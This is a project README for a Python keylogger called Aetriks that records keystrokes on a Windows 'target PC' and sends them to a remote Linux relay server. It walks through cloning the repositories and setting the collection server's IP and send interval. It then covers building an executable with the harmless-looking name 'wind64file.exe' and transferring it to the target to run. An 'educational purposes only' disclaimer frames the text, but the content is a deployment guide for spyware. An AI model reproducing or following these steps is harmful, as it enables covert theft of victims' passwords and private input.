# Aetriks: Simple Python Keylogger

A simple Python keylogger that captures keystrokes on a Windows target PC and sends them to a remote server running on Linux.

> **Disclaimer**:  
> This code is for **educational purposes only**! Do not use it for any illegal activities. Misuse of this tool is your responsibility.

---

## Features

- Captures keystrokes in real-time on a Windows target PC.
- Sends collected keystrokes to a remote server running on Linux.
- Configurable server IP, port, and data transmission interval.

---

## Installation Guide (Linux)

### **Step 1: Clone the Repository**

1. Clone the Aetriks repository:
   ```bash
   git clone https://github.com/frHimanshu/Aetriks.git
   cd Aetriks
   ```

2. Clone the Aetriks Relay Server repository inside the `Aetriks` directory:
   ```bash
   git clone https://github.com/frHimanshu/aetriks-relay.git
   ```

---

### **Step 2: Set Up the Keylogger**

1. Create a virtual environment:
   ```bash
   python3 -m venv keylogger_env
   source keylogger_env/bin/activate
   ```

2. Install required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Edit the `config.json` file:
   - Update the `ip_address` field with the IP address of the Linux machine running the Aetriks Relay Server.
   - Example:
     ```json
     {
         "ip_address": "192.168.105.74",
         "port_number": 8080,
         "time_interval": 10
     }
     ```

4. Convert the keylogger to a Windows executable:
   - Install PyInstaller:
     ```bash
     pip install pyinstaller
     ```
   - Build the executable:
     ```bash
     pyinstaller keylogger.spec
     ```
   - The output executable (`wind64file.exe`) will be located in the `dist` directory.

5. Transfer the executable to the Windows target PC and run it by double-clicking the file.

---

### **Step 3: Set Up the Aetriks Relay Server**

Refer to the [Aetriks Relay Server Repository](https://github.com/frHimanshu/aetriks-relay) for detailed installation instructions.

---

## Legal and Ethical Use

This project is for **educational purposes only**.  
**Make sure you have explicit permission** before running this on any device. Misuse of this tool is your responsibility.

---

## Contribution

Feel free to contribute to this project by submitting issues or pull requests on [GitHub](https://github.com/frHimanshu/Aetriks).

---

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.
